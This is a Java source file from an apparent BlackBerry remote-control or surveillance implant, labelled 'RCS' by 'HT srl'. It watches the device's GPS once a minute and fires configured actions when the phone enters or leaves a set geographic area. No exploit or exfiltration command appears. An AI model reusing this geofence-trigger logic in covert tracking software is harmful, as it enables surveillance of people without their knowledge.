//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LocationEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.io.IOException;

import javax.microedition.location.Coordinates;
import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;
import javax.microedition.location.QualifiedCoordinates;

import net.rim.device.api.util.DataBuffer;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;


/**
 * The Class LocationEvent.
 */
public final class LocationEvent extends Event implements LocationObserver {
    private static final long LOCATION_PERIOD = 60000;
    private static final long LOCATION_DELAY = 1000;
    //#ifdef DEBUG
    private static Debug debug = new Debug("LocationEvent", DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    int distance;
    double latitudeOrig;
    double longitudeOrig;
    Coordinates coordinatesOrig;

    LocationProvider lp;
    boolean entered = false;

    //int interval = 60;

    /**
     * Instantiates a new location event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public LocationEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_LOCATION, actionId, confParams, "LocationEvent");
    }

    protected void actualStart() {
        final Criteria criteria = new Criteria();
        criteria.setCostAllowed(true);

        criteria.setHorizontalAccuracy(50);
        criteria.setVerticalAccuracy(50);
        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);

        try {
            lp = LocationProvider.getInstance(criteria);

        } catch (final LocationException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

        if (lp == null) {
            //#ifdef DEBUG
            debug.error("GPS Not Supported on Device");
            //#endif               
            setPeriod(NEVER);
            return;
        }

        //#ifdef DEBUG
        debug.trace("setLocationListener");
        //#endif
        //lp.setLocationListener(this, interval, Conf.GPS_TIMEOUT, Conf.GPS_MAXAGE);

        entered = false;
    }

    protected void actualStop() {
        if (lp != null) {
            //#ifdef DEBUG
            debug.trace("actualStop: resetting");
            //#endif
            //lp.setLocationListener(null, -1, -1, -1 );
            lp.reset();
        }
    }

    boolean waitingForPoint = false;

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif
        if (lp == null) {
            //#ifdef DEBUG
            debug.error("GPS Not Supported on Device");
            //#endif               
            return;
        }

        if (waitingForPoint) {
            //#ifdef DEBUG
            debug.trace("waitingForPoint");
            //#endif
            return;
        }

        synchronized (this) {
            LocationHelper.getInstance().locationGPS(lp, this, false);
        }

        //#ifdef DEBUG
        debug.trace("exiting actualRun");
        //#endif
    }

    public void newLocation(Location loc) {
        //#ifdef DEBUG
        debug.trace("checkProximity: " + loc);
        //#endif

        QualifiedCoordinates coord = null;
        try {
            coord = loc.getQualifiedCoordinates();
            coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
                    coord.getAltitude());

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("QualifiedCoordinates: " + ex);
            //#endif
            return;

        }

        try {
            final double actualDistance = coord.distance(coordinatesOrig);
            //#ifdef DEBUG
            debug.info("Distance: " + actualDistance);
            //#endif
            if (actualDistance < distance) {
                if (!entered) {
                    //#ifdef DEBUG
                    debug.info("Enter");
                    //#endif
                    trigger(actionOnEnter);
                    entered = true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("Already entered");
                    //#endif
                }
            } else {
                if (entered) {
                    //#ifdef DEBUG
                    debug.info("Exit");
                    //#endif
                    trigger(actionOnExit);
                    entered = false;
                } else {
                    //#ifdef DEBUG
                    debug.trace("Already exited");
                    //#endif
                }
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("Distance: " + ex);
            //#endif
            return;
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        if (!Conf.GPS_ENABLED) {
            //#ifdef DEBUG
            debug.warn("GPS disabled by compilation");
            //#endif
            return true;
        } else {
            try {
                actionOnEnter = actionId;
                actionOnExit = databuffer.readInt();

                distance = databuffer.readInt();

                latitudeOrig = databuffer.readDouble();
                longitudeOrig = databuffer.readDouble();
                coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
                        0);

                //#ifdef DEBUG
                debug.info("Lat: " + latitudeOrig + " Lon: " + longitudeOrig
                        + " Dist: " + distance);
                //#endif

                setPeriod(LOCATION_PERIOD);
                setDelay(LOCATION_DELAY);
                //setPeriod(NEVER);

            } catch (final EOFException e) {
                return false;
            } catch (final IOException e) {
                return false;
            }
            return true;
        }
    }

    public synchronized void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

    public void errorLocation() {
        //#ifdef DEBUG
        debug.error("errorLocation");
        //#endif
    }

}
